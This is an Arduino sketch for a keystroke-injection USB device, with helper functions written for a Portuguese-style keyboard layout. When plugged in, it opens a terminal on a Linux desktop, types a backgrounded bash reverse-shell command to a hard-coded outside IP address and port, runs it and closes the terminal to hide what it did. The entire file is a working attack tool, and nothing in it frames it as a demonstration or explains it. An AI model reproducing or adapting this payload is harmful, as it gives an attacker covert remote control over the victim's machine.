#include <Keyboard.h>

void openterm() {
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('t');
  Keyboard.releaseAll();
}
void enter() {
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
}
void closeTerm() {
  //Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('d');
  Keyboard.releaseAll();
}
void barra() {
  Keyboard.press(KEY_RIGHT_ALT);
  Keyboard.press('q');
  Keyboard.releaseAll();
}
void eComercial() {
  Keyboard.press(KEY_RIGHT_ALT);
  Keyboard.press(KEY_RIGHT_SHIFT);
  Keyboard.press('k');
  Keyboard.releaseAll();
}
void sinalMaior() {
  Keyboard.press(KEY_RIGHT_ALT);
  Keyboard.press(KEY_RIGHT_SHIFT);
  Keyboard.press('x');
  Keyboard.releaseAll();
}

void setup() {
  Keyboard.begin();
  delay(600);
  openterm();
  delay(2500);

  Keyboard.print("nohup ");
  delay(100);
  Keyboard.print("{ bash -i ");
  delay(100);
  sinalMaior();
  eComercial();
  Keyboard.print(' ');
  delay(100);
  barra();
  Keyboard.print("dev");
  delay(100);
  barra();
  Keyboard.print("tcp");
  delay(100);
  barra();
  Keyboard.print("104.248.66.99");
  delay(100);
  barra();
  Keyboard.print("4000 ");
  delay(100);
  Keyboard.print("0");
  delay(100);
  sinalMaior();
  eComercial();
  Keyboard.print("1{ ");
  //delay(100);
  eComercial();
  //delay(100);
  enter();
  
  delay(250);
  //closeTerm();
  //Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('d');
  Keyboard.releaseAll();
  delay(100);
  enter();

}

void loop() {
  // put your main code here, to run repeatedly:

}
